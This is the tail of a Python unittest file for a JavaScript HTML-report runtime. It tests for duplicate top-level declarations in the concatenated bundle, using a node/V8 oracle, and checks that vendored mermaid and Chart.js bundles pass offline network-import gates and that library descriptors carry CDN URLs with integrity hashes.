        ("`let` used as a plain identifier in a comma expression (sloppy mode)",
         "(() => {\nlet sink = 0;\nlet = 1, sink = 2;\n})();", set(), {"sink"}),
        ("a label named `let`, which is not a declaration",
         "(() => {\nlet first = 1, sink = 0;\nlet: foo(), sink = 2;\n})();",
         set(), {"first", "sink"}),
        ("a plain statement after the wrapper closes",
         "(() => {\nfunction f() {}\n})();\nwindow.cmhReady && window.cmhReady();\n",
         set(), {"f"}),
        ("a duplicate behind a labelled statement (a label declares into this scope too)",
         "(() => {\nretry: function dup() {}\nfunction dup() {}\n})();", {"dup"}, {"dup"}),
        ("a duplicate after a postfix update ended the previous statement",
         "(() => {\nlet i = 0;\ni++\nfunction dup() {}\nfunction dup() {}\n})();",
         {"dup"}, {"i", "dup"}),
        ("a statement starting with a literal or a unary, not a declarator continuation",
         '(() => {\nlet first = 1, sink = 0\n"side", sink = 2;\n!0, sink = 3;\n})();',
         set(), {"first", "sink"}),
        ("a postfix update, a division and a string closer on one declarator line",
         '(() => {\nlet n = 1;\nlet s = n++ / 2, t = ")";\nfunction one() {}\n'
         "function two() {}\n})();", set(), {"n", "s", "t", "one", "two"}),
        ("a keyword used as a property before a division",
         "(() => {\nconst r = obj.of / 2, s = a / b;\nfunction dup() {}\nfunction dup() {}\n})();",
         {"dup"}, {"r", "s", "dup"}),
        ("a trailing comment holding a brace after the wrapper closes",
         "(() => {\nfunction f() {}\n})();\n// a trailing note with a { brace\n",
         set(), {"f"}),
        ("`of` as a plain identifier before a division, not a for-of keyword",
         "(() => {\nvar first = of / 2, dup = 1 / divisor;\nvar dup = 2;\n})();",
         {"dup"}, {"first", "dup"}),
        ("a regex in a for-of header, where `of` IS the keyword",
         "(() => {\nfor (const m of /a/.exec(s)) { use(m); }\nfunction dup() {}\n"
         "function dup() {}\n})();", {"dup"}, {"dup"}),
        ("a line comment ended by U+2028, which also terminates one",
         "(() => {\n// note\u2028function dup() {}\nfunction dup() {}\n})();",
         {"dup"}, {"dup"}),
        ("an Annex B HTML-like comment, which a classic script may carry",
         "(() => {\n<" + "!--\nfunction dup() {}\nfunction dup() {}\n})();",
         {"dup"}, {"dup"}),
    )

    # Controls for the walk's fail-closed reporting: each sample must be REFUSED (a non-empty
    # `patterns` or `problems`), because the walk cannot name what it holds and a silent skip is
    # how a duplicate would slip past. Each entry is (label, bundle, field).
    _SHARED_SCOPE_REFUSALS = (
        ("a destructuring binding at the shared scope",
         "(() => {\nconst { a, b } = source;\n})();", "patterns"),
        ("a destructuring binding after a comma in a declarator list",
         "(() => {\nconst first = 1, { dup } = source;\n})();", "patterns"),
        ("an array destructuring binding after a comma",
         "(() => {\nlet first = 1, [dup] = source;\n})();", "patterns"),
        ("an identifier spelled with a unicode escape",
         "(() => {\nfunction \\u0064up() {}\nfunction dup() {}\n})();", "problems"),
        ("a regex read as division, whose body then unwinds the shared scope",
         '(() => {\nif (ok) /}/.test(s);\nfunction dup() {}\nfunction dup() {}\n})();',
         "problems"),
        ("a closer swallowed out of a regex that a control header made look like division",
         '(() => {\nif (true) /\\)/.test("x");\nfunction dup() {}\nfunction dup() {}\n})();',
         "problems"),
    )

    def _assert_v8_agrees(self, label, source, scan):
        """A REAL JS engine as the independent oracle, when node is on PATH (CI always has it).

        Two things V8 can settle that no Python walk can. First, PARSING: a duplicate top-level
        `const`/`let`/`class` is a SyntaxError, so if the body parses, that half of the invariant
        holds no matter what the walk thinks. Second, HOISTING: run the body as a script whose
        first statement is a `throw`, and V8 instantiates the scope - creating every top-level
        function binding on the global object - before executing a single statement of the
        runtime. Those names are ground truth for "what the shared scope declares", and every one
        of them must be a name the walk found. It is a SUPERSET check with no false reds: a
        declaration inside a comment, a template, or a nested function is not hoisted, so none of
        them can red this.
        """
        node = shutil.which("node")
        if not node:
            return
        body = source[source.index("{") + 1:source.rindex("}")]
        script = (
            "const vm=require('vm');let raw='';"
            "process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const body=JSON.parse(raw).body;const sandbox={};const ctx=vm.createContext(sandbox);"
            "const before=new Set(Object.getOwnPropertyNames(sandbox));let ran='';"
            "try{new vm.Script('throw 0;\\n'+body,{filename:'hoist.js'})"
            ".runInContext(ctx,{timeout:20000});ran='no-throw';}"
            "catch(e){ran=(e===0)?'ok':('unexpected: '+String(e&&e.message).slice(0,200));}"
            "const names=Object.getOwnPropertyNames(sandbox).filter(n=>!before.has(n));"
            "let parse='ok';"
            "try{new vm.Script('(function () {\\n'+body+'\\n})',{filename:'parse.js'});}"
            "catch(e){parse=String(e&&e.message).slice(0,200);}"
            "process.stdout.write(JSON.stringify({ran:ran,parse:parse,names:names}));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps({"body": body}).encode(),
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.assertEqual(proc.returncode, 0,
                         "the node oracle failed on %s: %s"
                         % (label, proc.stderr.decode("utf-8", "replace")[:400]))
        result = json.loads(proc.stdout.decode("utf-8"))
        self.assertEqual(
            result["parse"], "ok",
            "V8 refuses to parse %s: %s. A duplicate top-level `const`/`let`/`class` is a "
            "SyntaxError, so this is the whole runtime failing to load - every report built from "
            "it renders as inert HTML." % (label, result["parse"]))
        self.assertEqual(
            result["ran"], "ok",
            "the node oracle did not abort before the body ran on %s (%s), so its hoisted-name "
            "list is not trustworthy - fix the oracle rather than trusting this result."
            % (label, result["ran"]))
        hoisted = set(result["names"])
        self.assertTrue(
            len(hoisted) > 500,
            "V8 hoisted only %d top-level names out of %s, so the oracle is not seeing the "
            "runtime and is not checking anything." % (len(hoisted), label))
        walked = set(name for _kind, name, _at in scan.declarations)
        self.assertEqual(
            sorted(hoisted - walked), [],
            "V8 hoists %s at the top level of %s and the delimiter walk did not find them. The "
            "walk is under-reporting, so a duplicate of any of those names would go unreported - "
            "fix `_js_shared_scope_declarations`." % (sorted(hoisted - walked)[:20], label))

    def test_no_declaration_in_the_bundle_is_made_twice(self):
        """CMH-BUILD-23: one name, one declaration, across the whole concatenated runtime.

        The `assets/js/NN-*.js` partials are concatenated into ONE classic script inside ONE IIFE,
        so every partial's top-level `function` / `class` / `const` / `let` / `var` shares a single
        scope - and nothing checked that a name is claimed once. A redeclared `function` is LEGAL
        there: the LATER declaration wins, the earlier one becomes dead code, and #1183 shipped two
        identical `_cmhCommentableLink` declarations through a fully green Playwright suite, the
        Python suites, `rebuild_all.py --check` and the pre-push hook, baked into `SHAREABLE.html`
        and every built example. A reviewer reading the file found it. The `const` case fails the
        other way and just as unhelpfully: the bundle stops parsing, every report renders as inert
        HTML, and the error names a line in a multi-megabyte artifact rather than the identifier.

        The per-declaration text pins added in #1183 do not generalize - the next duplicate is some
        other identifier - so this scans the whole bundle and names whatever it finds.

        A duplicate shared-scope `var` is held to the same rule even though JS allows it: two
        partials claiming one `var` is an accident, and a second initializer silently overwrites
        the first. The walk is a heuristic and does not claim to see every binding - notably it
        does not model hoisting out of a nested block (see the helper's docstring). What bounds
        that is the layering here: V8's own PARSE settles the `const`/`let`/`class` half outright
        (a duplicate there is a SyntaxError), V8's hoisted top-level names catch a `function` the
        walk missed entirely, and the column-0 cross-check catches the walk seeing one of two
        identical column-0 declarations - which is #1183's exact shape.
        """
        for label, sample, expected_dupes, expected_names in self._SHARED_SCOPE_CONTROLS:
            scan = _js_shared_scope_declarations(sample)
            self.assertEqual(scan.stack, [], "the scan lost track of a delimiter on %s" % label)
            self.assertEqual(scan.patterns, [],
                             "unexpected destructuring in the %s control" % label)
            self.assertEqual(scan.problems, [], "unexpected refusal in the %s control: %r"
                                                % (label, scan.problems))
            names = [name for _kind, name, _at in scan.declarations]
            self.assertLessEqual(
                expected_names, set(names),
                "the scan missed %s in %s - it saw %r, so it is under-reporting and the real "
                "bundle below would pass vacuously" % (
                    sorted(expected_names - set(names)), label, sorted(set(names))))
            self.assertLessEqual(
                set(names), expected_names,
                "the scan invented %s in %s - a name it reports that is not declared at the "
                "shared scope would red an innocent partial"
                % (sorted(set(names) - expected_names), label))
            duplicates = set(n for n in names if names.count(n) > 1)
            self.assertEqual(
                duplicates, expected_dupes,
                "the scan reported %r as duplicated in %s, expected %r" % (
                    sorted(duplicates), label, sorted(expected_dupes)))

        for label, sample, field in self._SHARED_SCOPE_REFUSALS:
            scan = _js_shared_scope_declarations(sample)
            self.assertNotEqual(
                getattr(scan, field), [],
                "the scan accepted %s without reporting it in `%s`. It cannot name what that "
                "construct binds, so accepting it silently is how a duplicate slips through - the "
                "walk must refuse what it does not model." % (label, field))

        js_dir = os.path.join(_paths.DEV, "assets", "js")
        partials = sorted(n for n in os.listdir(js_dir) if n.endswith(".js"))
        self.assertGreater(len(partials), 10,
                           "only %d source partials found in %s - the split moved and this scan "
                           "is reading the wrong directory" % (len(partials), js_dir))
        chunks, offsets, at = [], [], 0
        for name in partials:
            text = self._read(name)
            offsets.append((at, name))
            chunks.append(text)
            at += len(text)
        bundle = "".join(chunks)

        # The BUILT layer is scanned too, not only the concatenated source: a build step that
        # emitted a partial twice would duplicate every declaration in it, and the built bytes are
        # what ships inside `SHAREABLE.html` and every example. Required, not best-effort - making
        # it conditional would let the only shipped-bytes check vanish exactly where the build is
        # broken.
        built_path = os.path.join(_paths.DEV, "skill", "dist", "commentable-html.js")
        self.assertTrue(os.path.exists(built_path),
                        "the built layer is missing at %s - run `python scripts/rebuild_all.py`"
                        % built_path)
        with open(built_path, "r", encoding="utf-8", newline="") as fh:
            built = fh.read()

        def source_place(index):
            owner, start = offsets[0][1], offsets[0][0]
            for begin, name in offsets:
                if begin > index:
                    break
                owner, start = name, begin
            return "assets/js/%s line %d" % (owner, bundle.count("\n", start, index) + 1)

        def built_place(index):
            return "skill/dist/commentable-html.js line %d" % (built.count("\n", 0, index) + 1)

        for label, source, place, indented in (
                ("the concatenated source partials (assets/js/NN-*.js)", bundle, source_place, True),
                ("the BUILT layer (skill/dist/commentable-html.js)", built, built_place, False)):
            scan = _js_shared_scope_declarations(source)
            self.assertEqual(
                scan.stack, [],
                "the declaration scan ended inside an unclosed %r while walking %s. It lost track "
                "of the delimiter stack, so it can only UNDER-report duplicates - fix the walk "
                "(a new syntax it does not model, or a `/` read as the wrong thing) rather than "
                "trusting this result." % (scan.stack[-1:] or [""], label))
            self.assertEqual(
                scan.problems, [],
                "the declaration scan refused to trust itself while walking %s:\n%s\n"
                "Each entry is something the walk knows it cannot model, so the result would "
                "under-report. Fix the construct, or teach `_js_shared_scope_declarations` to "
                "handle it." % (label, "\n".join("  %s - %s" % (place(where), why)
                                                 for where, why in scan.problems)))
            self.assertEqual(
                scan.patterns, [],
                "%s now declares a destructuring binding at the shared scope (%s). The walk does "
                "not name the bindings inside a pattern, so it would silently skip them - extend "
                "`_js_shared_scope_declarations` to unpack the pattern."
                % (label, ", ".join(place(where) for where in scan.patterns) or "nowhere"))
            # The shared scope must be the bundle's outer WRAPPER, not some deep stack the walk
            # happened to lock onto: a mis-lock would compare unrelated locals. Asserted
            # structurally (grouping parens, then one brace) rather than by byte offset, so a
            # longer header or an extra paren around the wrapper is not a failure.
            self.assertTrue(
                scan.scope_key is not None and scan.scope_key[-1:] == ("{",)
                and set(scan.scope_key[:-1]) <= {"("},
                "the scan locked its shared scope onto %r at offset %d in %s. That is not the "
                "bundle's outer wrapper, so it is comparing the wrong names - re-point the walk "
                "at whatever wraps the runtime now." % (scan.scope_key, scan.scope_at, label))
            self.assertGreater(
                len(scan.declarations), 500,
                "the scan found only %d shared-scope declarations in %s. The runtime has well "
                "over a thousand, so the walk is reading the wrong scope and this guard is not "
                "guarding anything." % (len(scan.declarations), label))

            # An independent floor on the walk, because the self-checks above catch a WHOLESALE
            # failure and not a partial under-count: a plain column-0 regex must not find MORE
            # declarations of a name than the walk did. It is deliberately restricted to names the
            # walk already knows are shared-scope declarations - the point is to catch "the walk
            # saw one of two identical declarations" (exactly #1183's shape, both copies at column
            # 0), not to make the source avoid a comment or a template whose line happens to start
            # with the word `function`. It is also deliberately anchored at column 0 rather than
            # `^\s*`: allowing indentation makes it count the runtime's NESTED functions, which
            # are correctly not shared-scope declarations, and that reds today (measured: `menu`
            # and `root` are each a shared-scope name AND a local binding in a nested function).
            # ... which is why this floor runs on the INDENTED source only. The build strips layout
            # whitespace from the bytes that ship (CMH-BUILD-26), so in the built layer EVERY
            # declaration sits at column 0 and the anchor stops separating shared scope from a
            # nested local - the heuristic's precondition is gone, and with `^\s*` it reds on
            # exactly the `menu` / `root` pair named above. The built layer is still walked, still
            # cross-checked against V8 below, and still reported on for duplicates; only this
            # indentation-dependent backstop is scoped to where indentation exists.
            walked = collections.Counter(name for _kind, name, _at in scan.declarations)
            if indented:
                naive = collections.Counter(
                    m.group(1) for m in re.finditer(
                        r"(?m)^(?:async\s+)?(?:function\s*\*?\s*|class\s+|const\s+|let\s+|var\s+)"
                        r"((?:[^\W\d]|\$)[\w$]*)", source))
                missed = sorted(name for name, count in naive.items()
                                if walked[name] and walked[name] < count)
                self.assertEqual(
                    missed, [],
                    "a plain column-0 scan of %s finds %s declared more often than the delimiter "
                    "walk did (%s). The walk skipped a declaration of a name it otherwise knows, "
                    "so a duplicate of it could go unreported. (If one of those lines is really "
                    "inside a block comment or a template literal, indent it.)" % (
                        label, missed, ", ".join("%s: %d vs %d" % (name, naive[name], walked[name])
                                                 for name in missed)))

            self._assert_v8_agrees(label, source, scan)

            sites = {}
            for kind, name, index in scan.declarations:
                sites.setdefault(name, []).append((kind, index))
            report = "\n".join(
                "  %s `%s` declared %d times: %s" % (
                    "/".join(sorted(set(kind for kind, _ in found))), name, len(found),
                    ", ".join(place(index) for _kind, index in found))
                for name, found in sorted(sites.items()) if len(found) > 1)
            self.assertEqual(
                report, "",
                "%s declares a name more than once in the shared IIFE scope:\n%s\n"
                "Every partial's top-level declarations share ONE scope. A duplicate `function` "
                "is legal and the LATER one silently wins (so a pin that reads the first guards "
                "dead code, and an edit to one copy is discarded); a duplicate `const`/`let`/"
                "`class` is a bundle-wide SyntaxError that renders every report as inert HTML. "
                "Delete the stale copy, or rename one of them." % (label, report))

    def test_the_vendored_bundles_pass_the_offline_capture_gates(self):
        """Both paths that inline a library run its bytes through the same content gates, so the
        VENDORED bytes must satisfy them.

        This started as the re-export CAPTURE gate, but the PAYLOAD path now shares the predicate
        (`_offlineLibBytesUnsafe`), so these bytes face the gates on the ORDINARY export too, not
        only on a re-export. Both gates are cheap today only because the bundles happen to be clean.
        That is a property of the vendored files, not of the code, so a routine `mermaid` /
        `Chart.js` upgrade could silently make a legitimate export fail - and, because the refusal
        is deliberately fail-closed with no fallback, it would fail for every already-finalized
        document in the wild, not just here. Pin it where a dependency bump trips it, rather than in
        a browser test nobody connects to the upgrade.
        """
        source = self._read("68-export-offline.js")
        start = source.find("function _offlineScriptHasNetworkImport")
        self.assertNotEqual(start, -1, "the runtime no longer defines _offlineScriptHasNetworkImport")
        body = source[start:source.find("\n}", start)]
        patterns = re.findall(r"/((?:[^/\\\n]|\\.)+)/i?\.test\(src\)", body)
        self.assertEqual(
            len(patterns), 5,
            "_offlineScriptHasNetworkImport no longer has exactly 5 regex terms (found %d). The "
            "sufficient condition asserted below was derived from those terms; re-derive it."
            % len(patterns))

        # Assert a SUFFICIENT condition rather than re-evaluating the predicate: every one of its
        # terms requires a dynamic `import(` or a remote `from`/`import` string literal, so a bundle
        # with none of those cannot match any term. (Checking the terms individually would be
        # wrong - one of them is a conjunction, and its URL-literal half matches an innocuous
        # xlink namespace string inside mermaid.) The gate is now import OR NAVIGATION
        # (`_offlineScriptHasNetworkEgress`), so the navigation pattern is evaluated directly here
        # too: a bundle that ever tripped it would make a legitimate re-export fail loudly AND make
        # `validate.py --strict` reject the very file the exporter produced (the strict check scans
        # every executable inline script, and the library is appended after the strips run).
        blockers = [
            re.compile(r"\bimport\s*\("),
            re.compile(r"\bfrom\s+[\"'](?:https?:)?//", re.IGNORECASE),
            re.compile(r"\bimport\s+[\"'](?:https?:)?//", re.IGNORECASE),
        ]
        vendor = os.path.join(_paths.DEV, "assets", "vendor")
        for name in ("mermaid.min.js", "chart.umd.min.js"):
            path = os.path.join(vendor, name)
            self.assertTrue(os.path.exists(path), "missing vendored bundle %s" % path)
            with open(path, "r", encoding="utf-8", newline="") as fh:
                code = fh.read()
            for rx in blockers:
                self.assertIsNone(
                    rx.search(code),
                    "%s now contains %r, so it can trip the offline network-egress check and BOTH "
                    "inline paths would REJECT the genuine library - every export of a document "
                    "needing it would fail loudly. Re-check the bundle, or narrow that check."
                    % (name, rx.pattern))
            self.assertEqual(
                resources.offline_nav_sink_index(code, False), -1,
                "%s now scripts a navigation to a network URL literal, so it can trip the offline "
                "network-egress check and BOTH inline paths would REJECT the genuine library - "
                "every export of a document needing it would fail loudly. Re-check the bundle, or "
                "narrow that check." % name)
            # An end tag (or a start tag) would trip the script-data escape gate in the emitted
            # element; a bare `<!--` is harmless on its own, and mermaid legitimately contains one.
            self.assertIsNone(
                re.search(r"<\/?script|<\/style", code, re.IGNORECASE),
                "%s now contains a script-data escape sequence, so both offline inline paths "
                "would reject the genuine library." % name)


class ByteFreeDescriptorTests(unittest.TestCase):
    """CMH-SIZE-03: a generated document names the libraries it needs instead of carrying them.

    The viewer never reads the payload - it imports mermaid from the CDN and an authored Chart.js
    arrives as its own CDN script - so the bytes existed only to pre-stage a possible future Offline
    export. They are now fetched at export time and verified against a recorded SRI hash, which is
    why the descriptor must carry a URL and an integrity hash but no base64.
    """

    def setUp(self):
        sys.path.insert(0, os.path.join(_paths.DEV, "skill", "tools", "authoring"))
        import _vendored_payload
        self.payload = _vendored_payload

    def _descriptor(self):
        return {
            "encoding": self.payload.DEFAULT_ENCODING,
            "mermaidUrl": "https://cdn.jsdelivr.net/npm/mermaid@11.16.1/dist/mermaid.min.js",
            "mermaidIntegrity": "sha384-" + "m" * 64,
            "chartjsUrl": "https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js",
            "chartjsIntegrity": "sha384-" + "c" * 64,
            "mermaidLicense": "MIT mermaid",
            "chartjsLicense": "MIT chartjs",
        }

    def test_a_url_and_integrity_pair_counts_as_carrying_the_library(self):
        # The whole point of the change: a document that names the library carries it, so the
        # reconciler must not treat a byte-free document as one that needs bytes restored.
        self.assertEqual(self.payload.carried_libs(self._descriptor()), {"mermaid", "chartjs"})

    def test_a_url_without_an_integrity_hash_does_not_count(self):
        # Fail-safe: an unverifiable source is not a source. Accepting it would let an export inline
        # whatever the network returned, which is strictly worse than refusing.
        obj = self._descriptor()
        del obj["mermaidIntegrity"]
        self.assertEqual(self.payload.carried_libs(obj), {"chartjs"})

    def test_a_descriptor_without_its_mit_notice_does_not_count(self):
        # MIT compliance must never depend on the network, so the notice stays embedded and a
        # descriptor missing it carries nothing - same rule the bytes always obeyed.
        obj = self._descriptor()
        del obj["mermaidLicense"]
        self.assertEqual(self.payload.carried_libs(obj), {"chartjs"})

    def test_a_legacy_payload_carrying_bytes_is_still_honoured(self):
        # Documents already in the wild keep exporting with zero network; the bytes remain a valid
        # way to carry a library, they are simply no longer the way new documents do it.
        legacy = {
            "encoding": self.payload.DEFAULT_ENCODING,
            "mermaidGzipBase64": "AAAA",
            "chartjsGzipBase64": "BBBB",
            "mermaidLicense": "MIT mermaid",
            "chartjsLicense": "MIT chartjs",
        }
        self.assertEqual(self.payload.carried_libs(legacy), {"mermaid", "chartjs"})

    def test_reconcile_keeps_the_descriptor_rather_than_restoring_bytes(self):
        # Reconciliation rebuilds from the canonical key order; a descriptor-shaped document must
        # come back descriptor-shaped, or every finalize would re-inflate the megabyte it just shed.
        out = self.payload.reconcile(self._descriptor(), {"mermaid", "chartjs"})
        self.assertIsNotNone(out)
        self.assertNotIn("mermaidGzipBase64", out)
        self.assertEqual(out["mermaidUrl"],
                         "https://cdn.jsdelivr.net/npm/mermaid@11.16.1/dist/mermaid.min.js")
        self.assertEqual(out["mermaidLicense"], "MIT mermaid")

    def test_the_build_emits_a_descriptor_with_no_library_bytes(self):
        # The measured win: the four mermaid-carrying examples each shed about 1,265 KB. Asserted on
        # the BUILD's own output so a future change that re-adds the bytes fails here.
        sys.path.insert(0, os.path.join(_paths.DEV, "tools"))
        import build as build_mod
        text = build_mod.build_vendored_rich_libs_json(os.path.join(_paths.DEV, "assets"))
        obj = json.loads(text.replace("\\u003C", "<").replace("\\u003E", ">")
                         .replace("\\u0026", "&"))
        self.assertNotIn("mermaidGzipBase64", obj)
        self.assertNotIn("chartjsGzipBase64", obj)
        self.assertTrue(obj["mermaidUrl"].startswith("https://cdn.jsdelivr.net/npm/mermaid@"))
        self.assertTrue(obj["mermaidIntegrity"].startswith("sha384-"))
        self.assertTrue(obj["mermaidLicense"].strip())
        self.assertLess(len(text), 8000,
                        "the descriptor must stay tiny - it replaced 1,357 KB of base64")


if __name__ == "__main__":
    unittest.main()
